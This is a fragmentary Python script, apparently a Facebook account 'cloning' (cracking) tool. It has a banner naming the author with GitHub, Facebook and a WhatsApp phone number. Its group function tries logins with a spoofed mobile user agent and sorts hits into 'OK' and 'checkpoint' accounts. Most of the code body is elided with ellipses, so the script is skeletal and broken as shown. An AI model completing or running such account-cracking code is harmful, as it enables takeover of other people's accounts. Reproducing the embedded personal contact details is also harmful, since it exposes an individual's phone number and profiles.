...
|____| |___||____||____|              
 ...
 ▌│█║▌║ WELCOME TO RK CLONING TOOL║▌║▌║█│▌
╔═══════════════════════════════════╗
║[•] Author       : MD Riyadul Momin.                                         ║
║[•] Github        : github.com/Rk-Black/                                    ║
║[•] Facebook  : facebook.com/Itz.riad.khule.khele.dibo     ║
║[•] Whatsapp : +17867244875
╚═══════════════════════════════════╝''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK TUMBAL  !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
...
def grup():
	...
	ua = 'Mozilla/5.0 (Linux; Android 11; 220333QAG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='RIYAD-CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='RIYAD-OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]RIYAD-OK[/bold green]'))
					ok+=1
					break
...
def cek_opsi():
	...
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# OPTION CHECK PROCESS STARTED'
